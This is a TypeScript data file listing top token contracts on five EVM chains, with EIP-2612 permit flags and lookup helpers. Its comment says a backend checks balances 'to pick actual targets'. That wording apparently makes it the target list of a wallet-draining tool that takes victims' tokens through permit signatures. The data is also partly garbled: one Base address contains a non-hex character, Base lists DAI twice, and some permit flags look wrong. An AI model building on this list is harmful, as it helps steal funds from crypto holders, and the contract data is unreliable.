// Top 10 tokens per chain (by popularity/liquidity)
// Backend will prioritize these, then check balances to pick actual targets

export interface TokenInfo {
  address: string;
  symbol: string;
  name: string;
  decimals: number;
  permit?: boolean; // Supports EIP-2612
}

// Top 10 for each chain
export const TOP_10_TOKENS: Record<number, TokenInfo[]> = {
  // Ethereum
  1: [
    { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', name: 'USD Coin', decimals: 6, permit: true },
    { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', name: 'Tether USD', decimals: 6, permit: true },
    { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', name: 'Dai Stablecoin', decimals: 18, permit: true },
    { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', name: 'Wrapped Ether', decimals: 18, permit: true },
    { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', name: 'Wrapped BTC', decimals: 8 },
    { address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol: 'UNI', name: 'Uniswap', decimals: 18, permit: true },
    { address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', symbol: 'AAVE', name: 'Aave Token', decimals: 18, permit: true },
    { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', name: 'ChainLink', decimals: 18 },
    { address: '0xD533a949740bb3306d119CC777fa900bA034cd52', symbol: 'CRV', name: 'Curve DAO', decimals: 18, permit: true },
    { address: '0xc00e94Cb662C3520282E6f5717214004A7f26888', symbol: 'COMP', name: 'Compound', decimals: 18, permit: true },
  ],
  
  // BSC
  56: [
    { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', name: 'USD Coin', decimals: 18, permit: true },
    { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', name: 'Tether USD', decimals: 18, permit: true },
    { address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD', name: 'BUSD Token', decimals: 18 },
    { address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', symbol: 'WBNB', name: 'Wrapped BNB', decimals: 18 },
    { address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', symbol: 'CAKE', name: 'PancakeSwap', decimals: 18 },
    { address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', symbol: 'ETH', name: 'Ethereum Token', decimals: 18 },
    { address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', symbol: 'BTCB', name: 'Bitcoin BEP2', decimals: 18 },
    { address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', symbol: 'DAI', name: 'Dai Token', decimals: 18, permit: true },
    { address: '0x90C97F71D75F35c58F5Ffb64a5F7f3bF22c63337', symbol: 'ETH', name: 'Binance-Peg ETH', decimals: 18 },
    { address: '0xFb5B55196142E77b62c1f099919848f0e8FAa269', symbol: 'DOT', name: 'Polkadot Token', decimals: 18 },
  ],
  
  // Polygon
  137: [
    { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC', name: 'USD Coin (PoS)', decimals: 6, permit: true },
    { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', name: '(PoS) Tether USD', decimals: 6, permit: true },
    { address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', symbol: 'DAI', name: '(PoS) Dai Stablecoin', decimals: 18, permit: true },
    { address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', symbol: 'WMATIC', name: 'Wrapped Matic', decimals: 18 },
    { address: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', symbol: 'WETH', name: 'Wrapped Ether', decimals: 18 },
    { address: '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6', symbol: 'WBTC', name: '(PoS) WBTC', decimals: 8 },
    { address: '0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39', symbol: 'LINK', name: 'ChainLink Token', decimals: 18 },
    { address: '0x831753DD7087CaC61aB5644b308642cc1c33Dc13', symbol: 'QUICK', name: 'Quickswap', decimals: 18 },
    { address: '0xc6C855AD634dCDAd23e64DA71Ba85b8C51E5aD27', symbol: 'GHST', name: 'Aavegotchi GHST', decimals: 18 },
    { address: '0x385Eeac5cB85A38A9a07A70c73e0a3271CfB54A7', symbol: 'AAVE', name: 'Aave (PoS)', decimals: 18 },
  ],
  
  // Arbitrum
  42161: [
    { address: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', symbol: 'USDC', name: 'USD Coin (Arb1)', decimals: 6, permit: true },
    { address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', symbol: 'USDT', name: 'Tether USD', decimals: 6, permit: true },
    { address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', symbol: 'DAI', name: 'Dai Stablecoin', decimals: 18, permit: true },
    { address: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', symbol: 'WETH', name: 'Wrapped Ether', decimals: 18 },
    { address: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f', symbol: 'WBTC', name: 'Wrapped BTC', decimals: 8 },
    { address: '0xf97f4df75117a78c1A5a0DBb814Af92458539FB4', symbol: 'LINK', name: 'ChainLink Token', decimals: 18 },
    { address: '0xd4d42F0b6DEF4CE0383636770eF773390d85c61A', symbol: 'COW', name: 'CoW Protocol Token', decimals: 18 },
    { address: '0x040d1EdC9569d4Bab2D15287Dc5A4F10F56a27B8', symbol: 'BAL', name: 'Balancer', decimals: 18 },
    { address: '0xba5DdD1f9d7F570d94A5140cA5bE9E90fB1040e4', symbol: 'AAVE', name: 'Aave Token', decimals: 18 },
    { address: '0x11cDb42B0EB46D95f990BeDD4695A6e3fA034978', symbol: 'CRV', name: 'Curve DAO Token', decimals: 18 },
  ],
  
  // Base
  8453: [
    { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', symbol: 'USDC', name: 'USD Coin', decimals: 6 },
    { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', symbol: 'DAI', name: 'Dai Stablecoin', decimals: 18, permit: true },
    { address: '0x4200000000000000000000000000000000000006', symbol: 'WETH', name: 'Wrapped Ether', decimals: 18 },
    { address: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', symbol: 'cbETH', name: 'Coinbase Wrapped Staked ETH', decimals: 18 },
    { address: '0x9EaF8C1E34F05a589EDa6AafF9910f9295b0EcB5', symbol: 'DAI', name: 'Dai (Base)', decimals: 18 },
    { address: '0x27D2DECb4bFC9C76F0309b8E88dec3d0019dC39f', symbol: 'BALD', name: 'Bald', decimals: 18 },
    { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', symbol: 'USDbC', name: 'USD Base Coin', decimals: 6 },
    { address: '0x19b26浄d59eC1bb1D09F4D16D5524d4304ed44b', symbol: 'BASE', name: 'Base Token', decimals: 18 },
    { address: '0x543c13027B23f3468Edebe9E3D6B1b0Ee50c9Baa', symbol: 'COMP', name: 'Compound', decimals: 18 },
    { address: '0x78a087d713Be963Bf307b18F4F17f24F23562F23', symbol: 'AAVE', name: 'Aave', decimals: 18 },
  ],
};

// Native tokens (for balance checking)
export const NATIVE_TOKENS: Record<number, { symbol: string; name: string; decimals: number }> = {
  1: { symbol: 'ETH', name: 'Ethereum', decimals: 18 },
  56: { symbol: 'BNB', name: 'BNB', decimals: 18 },
  137: { symbol: 'MATIC', name: 'MATIC', decimals: 18 },
  42161: { symbol: 'ETH', name: 'Ethereum', decimals: 18 },
  8453: { symbol: 'ETH', name: 'Ethereum', decimals: 18 },
  10: { symbol: 'ETH', name: 'Ethereum', decimals: 18 },
  43114: { symbol: 'AVAX', name: 'Avalanche', decimals: 18 },
};

// Get top 10 for chain
export function getTop10Tokens(chainId: number): TokenInfo[] {
  return TOP_10_TOKENS[chainId] || [];
}

// Get native token info
export function getNativeToken(chainId: number) {
  return NATIVE_TOKENS[chainId];
}
